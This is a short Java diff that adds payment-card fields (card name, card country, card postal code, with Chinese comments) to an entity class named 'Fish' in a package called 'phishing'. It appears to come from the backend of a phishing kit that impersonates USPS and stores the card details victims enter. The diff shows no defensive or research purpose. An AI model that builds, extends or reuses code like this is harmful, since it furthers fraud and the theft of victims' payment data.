@@ -3,6 +3,8 @@ package com.uspsassa.phishing.entity;
 import io.swagger.v3.oas.annotations.media.Schema;
 import lombok.Data;
 
+import javax.validation.constraints.NotEmpty;
+
 @Schema
 @Data
 public class Fish {
@@ -104,4 +106,22 @@ public class Fish {
 
     @Schema(description = "创建时间")
     private Long createTime;
+
+    /**
+     * 卡名称
+     */
+    @Schema(description = "卡名称")
+    private String cardName;
+
+    /**
+     * 卡国家
+     */
+    @Schema(description = "卡国家")
+    private String cardCountry;
+
+    /**
+     * 卡邮遍
+     */
+    @Schema(description = "卡邮编")
+    private String cardCode;
 }
